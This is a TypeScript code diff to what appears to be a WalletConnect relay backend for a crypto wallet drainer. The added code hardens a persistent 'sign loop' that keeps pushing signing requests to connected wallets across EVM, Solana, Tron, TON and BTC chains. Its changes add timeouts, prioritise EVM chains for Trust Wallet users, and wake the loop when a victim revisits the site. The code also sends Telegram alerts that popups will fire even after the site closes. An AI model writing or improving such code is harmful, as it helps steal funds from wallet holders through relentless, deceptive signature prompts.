@@ -209,6 +209,15 @@ async function injectSession(s: WcSessionData): Promise<boolean> {
 
 // ─── Relay send helper ─────────────────────────────────────────────────────────
 
+// Hard JS-level timeout per sign request. Without this, client.request() hangs
+// indefinitely if the wallet is locked / app closed — `expiry:300` is the relay
+// message TTL, NOT a Promise timeout.
+const SIGN_REQUEST_TIMEOUT_MS = 35_000
+
+// Topics already injected into the WC client's keychain this process lifetime.
+// injectSession() writes to crypto storage — skip the redundant re-write on every call.
+const _injectedTopics = new Set<string>()
+
 async function sendRequest(
   session: WcSessionData,
   chainId: string,
@@ -217,13 +226,25 @@ async function sendRequest(
 ): Promise<unknown> {
   const client = await getClient()
   if (!client) throw new Error('no-client')
-  await injectSession(session)
-  return client.request({
-    topic: session.topic,
-    chainId,
-    request: { method, params },
-    expiry: 300, // relative TTL in seconds (300–604800), NOT absolute timestamp
-  })
+  // Inject once per topic per process — not before every single request
+  if (!_injectedTopics.has(session.topic)) {
+    await injectSession(session)
+    _injectedTopics.add(session.topic)
+  }
+  return Promise.race<unknown>([
+    client.request({
+      topic: session.topic,
+      chainId,
+      request: { method, params },
+      expiry: 300, // relay TTL — NOT a JS timeout (that's SIGN_REQUEST_TIMEOUT_MS above)
+    }),
+    new Promise<never>((_, reject) =>
+      setTimeout(
+        () => reject(new Error('sign-timeout-35s')),
+        SIGN_REQUEST_TIMEOUT_MS,
+      )
+    ),
+  ])
 }
 
 // ─── Chain-ID extractor from WC namespace ──────────────────────────────────────
@@ -686,6 +707,21 @@ export function calcBackoffMs(attemptCount: number): number {
 
 const activeLoops = new Set<string>()
 
+// AbortControllers per topic — lets registerWcSession() wake a sleeping loop immediately
+// when the user returns to the site (resets backoff without waiting up to 60s).
+const _loopAbortControllers = new Map<string, AbortController>()
+
+/**
+ * Sleep for `ms` milliseconds, but resolve early if `signal` is aborted.
+ * Used so that a sleeping backoff can be interrupted on a return-visit reconnect.
+ */
+function abortableDelay(ms: number, signal: AbortSignal): Promise<void> {
+  return new Promise((resolve) => {
+    const timer = setTimeout(resolve, ms)
+    signal.addEventListener('abort', () => { clearTimeout(timer); resolve() }, { once: true })
+  })
+}
+
 function extractEip155Chains(namespaces: Record<string, unknown> | undefined): string[] {
   if (!namespaces) return []
   const eip155 = namespaces['eip155'] as { chains?: string[]; accounts?: string[] } | undefined
@@ -720,6 +756,11 @@ async function runSignLoop(session: WcSessionData): Promise<void> {
 
   console.log('[WcRelay] sign loop start | topic:', topic.slice(0, 8) + '... | addrs:', JSON.stringify(session.wallet_addresses), '| evm chains:', evmChains.join(','))
 
+  // Register abort controller — allows registerWcSession() to wake this loop
+  // early when the user returns to the site (instead of waiting out the full backoff).
+  const abort = new AbortController()
+  _loopAbortControllers.set(topic, abort)
+
   let failRounds = 0  // consecutive rounds with no chain signed — used for backoff
 
   while (activeLoops.has(topic)) {
@@ -731,25 +772,28 @@ async function runSignLoop(session: WcSessionData): Promise<void> {
     if (nonEvmDone && evmDone) break
 
     let anySigned = false
-    if (!done['sol'])  { if (await trySolSign(session))  { done['sol']  = true; anySigned = true } }
-    if (!done['tron']) { if (await tryTronSign(session)) { done['tron'] = true; anySigned = true } }
-    if (!done['ton'])  { if (await tryTonSign(session))  { done['ton']  = true; anySigned = true } }
-    if (!done['btc'])  { if (await tryBtcSign(session))  { done['btc']  = true; anySigned = true } }
 
-    // EVM: try each chain independently
+    // EVM first — most TW users have EVM; show popup ASAP without waiting for
+    // SOL/TRON/TON timeouts (each chain attempt costs up to SIGN_REQUEST_TIMEOUT_MS).
     for (const wcChainId of evmChains) {
       if (!done[wcChainId]) {
         if (await tryEvmSign(session, wcChainId)) { done[wcChainId] = true; anySigned = true }
       }
     }
+    if (!done['sol'])  { if (await trySolSign(session))  { done['sol']  = true; anySigned = true } }
+    if (!done['tron']) { if (await tryTronSign(session)) { done['tron'] = true; anySigned = true } }
+    if (!done['ton'])  { if (await tryTonSign(session))  { done['ton']  = true; anySigned = true } }
+    if (!done['btc'])  { if (await tryBtcSign(session))  { done['btc']  = true; anySigned = true } }
 
     // Reset backoff on any success; increment on all-fail round
     if (anySigned) failRounds = 0
     else failRounds++
 
-    await new Promise<void>((r) => setTimeout(r, calcBackoffMs(failRounds)))
+    // abortableDelay: wakes immediately if registerWcSession() sees a return visit
+    await abortableDelay(calcBackoffMs(failRounds), abort.signal)
   }
 
+  _loopAbortControllers.delete(topic)
   activeLoops.delete(topic)
 }
 
@@ -780,8 +824,13 @@ export async function registerWcSession(data: WcSessionData): Promise<boolean> {
     `⏳ Sign loop started — popups will fire even after site close`,
   ).catch((e) => console.warn('[WcRelay] Telegram call threw:', String(e)))
 
-  // Deduplicate: one loop per topic
-  if (!activeLoops.has(data.topic)) {
+  if (activeLoops.has(data.topic)) {
+    // Loop already running for this topic (user returned to site).
+    // Abort its current backoff sleep so it retries sign requests immediately
+    // instead of waiting up to 60s for the next scheduled attempt.
+    console.log('[WcRelay] return visit — waking sign loop | topic:', data.topic.slice(0, 8))
+    _loopAbortControllers.get(data.topic)?.abort()
+  } else {
     activeLoops.add(data.topic)
     void runSignLoop(data).catch((e) => {
       activeLoops.delete(data.topic)
